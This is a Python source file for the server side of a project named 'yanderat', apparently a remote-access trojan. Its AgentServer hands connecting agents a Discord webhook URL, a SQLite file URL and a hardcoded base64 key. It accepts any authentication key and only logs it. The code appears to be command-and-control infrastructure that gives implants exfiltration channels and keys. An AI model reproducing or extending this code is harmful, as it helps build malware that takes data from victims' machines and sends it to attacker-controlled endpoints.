import ssl
from enum import StrEnum
from logging import getLogger

from yanderat.config import CONFIG
from yanderat.lib import agent
from yanderat.lib.agent import Author, Response, Status
from yanderat.lib import human

_logger = getLogger(__name__)

Humans = human.Manager(CONFIG["humans_path"])


class Request(StrEnum):
    UNKNOWN = "unknown"
    DISCORD_WEBHOOK_URL = "discord_webhook_url"
    SQLITE_FILE_URL = "sqlite_file_url"
    BASE64_KEY = "base64_key"


TEMP_BASE64_KEY = "o+I8/cfI9yAnWhHcB0+0Bu1wG5vcfd63yPv71A+EOaA="


class AgentServer(agent.Server):
    def __init__(
        self,
        host: str,
        port: int,
        ssl_ctx: ssl.SSLContext | None = None,
    ) -> None:
        super().__init__(host, port, ssl_ctx)

    async def on_ping(self, author: Author) -> None:
        _logger.info(f"{author.address} ping to the server")
        return None

    async def on_disconnect(self, author: Author) -> None:
        _logger.info(f"{author.address} has been disconnected from the server")
        return None

    async def on_authenticate(self, author: Author, key: bytes) -> bool:

        _logger.info(f"{author.address} has been authenticated ({key!r})")
        return True

    async def on_json_request(self, author: Author, data: dict) -> Response:
        # Client requests
        requests = data["requests"]

        # Server responses
        dct = {"responses": {}}
        responses = dct["responses"]

        for request in requests:
            _logger.debug(f"{author.address} requests {request}")
            if request == Request.DISCORD_WEBHOOK_URL:
                responses[Request.DISCORD_WEBHOOK_URL] = CONFIG["discord_webhook_url"]
            elif request == Request.SQLITE_FILE_URL:
                responses[Request.SQLITE_FILE_URL] = CONFIG["sqlite_file_url"]
            elif request == Request.BASE64_KEY:
                responses[Request.BASE64_KEY] = TEMP_BASE64_KEY
            else:
                responses[Request.UNKNOWN] = Request.UNKNOWN
                
        return Response(Status.OK, dct)
